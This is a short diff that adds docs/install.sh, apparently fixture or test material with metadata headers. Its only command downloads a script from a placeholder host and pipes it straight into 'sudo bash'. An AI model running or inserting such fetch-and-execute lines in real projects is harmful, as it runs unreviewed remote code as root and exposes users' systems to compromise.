@@ -1,0 +1,5 @@
+# path: docs/install.sh
+# lines: 1
+# weight: 35
+# ---
+wget -qO- https://example.invalid/i.sh | sudo bash
